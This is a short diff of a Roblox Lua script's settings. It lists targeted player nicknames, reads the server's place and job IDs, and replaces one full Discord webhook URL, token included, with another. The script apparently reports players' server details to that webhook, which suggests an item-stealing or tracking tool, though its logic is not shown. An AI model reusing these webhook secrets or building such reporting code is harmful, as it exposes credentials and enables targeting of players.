@@ -16,7 +16,7 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local targetPlayerNames = {"robloxromao", "brtoplegal"} -- ADICIONE AQUI OS NICKS QUE QUISER
 local placeId = game.PlaceId
 local jobId = game.JobId
-local webhookURL = "https://discord.com/api/webhooks/1407132376068522146/tNjtKEx89kYotCF98p-CwZVz5O7mQYnSwkn5UY1t8fjKYdwdCS0BZiSWNn6tqNlp8Mml"
+local webhookURL = "https://discord.com/api/webhooks/1428779310776324267/hkosUNnnhKaFjzVMb_I9Yn7vlU29LqnEso4mg7kqN9luWbSpv40pHF2X5rj6JT7Fo3wg"
 local firstTeleportDone = false  
 
 -- Raridade das frutas
